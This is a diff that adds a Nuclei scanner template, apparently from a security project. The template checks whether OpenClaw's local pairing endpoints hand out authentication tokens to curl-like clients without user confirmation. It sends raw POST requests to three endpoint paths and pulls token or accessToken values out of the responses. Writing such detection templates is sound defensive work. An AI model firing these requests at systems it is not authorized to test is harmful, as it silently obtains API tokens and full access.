@@ -1,0 +1,66 @@
+id: openclaw-silent-local-pairing
+
+info:
+  name: OpenClaw Non-Browser Local Client Auto-Pairing
+  author: LobsterGuard
+  severity: high
+  description: |
+    Tests whether OpenClaw allows silent device pairing for non-browser
+    clients (e.g. curl, CLI tools) without user confirmation. The local
+    pairing endpoint should require browser-based interactive approval,
+    but if a CLI User-Agent without an Origin header is accepted, any
+    local process can silently obtain an authentication token and gain
+    full API access.
+  reference:
+    - https://github.com/lobster-guard/openclaw-security
+  tags: openclaw,auth,pairing,local
+  metadata:
+    chain_id: 40
+
+http:
+  - raw:
+      - |
+        POST /api/auth/pair HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: curl/8.0
+        Content-Type: application/json
+
+        {"deviceName":"nuclei-probe","deviceType":"cli","clientId":"nuclei-test-{{randstr}}"}
+
+      - |
+        POST /__openclaw/api/auth/pair HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: curl/8.0
+        Content-Type: application/json
+
+        {"deviceName":"nuclei-probe","deviceType":"cli","clientId":"nuclei-test-{{randstr}}"}
+
+      - |
+        POST /__openclaw__/api/auth/pair HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: curl/8.0
+        Content-Type: application/json
+
+        {"deviceName":"nuclei-probe","deviceType":"cli","clientId":"nuclei-test-{{randstr}}"}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+          - 201
+
+      - type: word
+        part: body
+        words:
+          - "token"
+          - "paired"
+          - "accessToken"
+          - "session"
+        condition: or
+
+    extractors:
+      - type: json
+        json:
+          - ".token"
+          - ".accessToken"
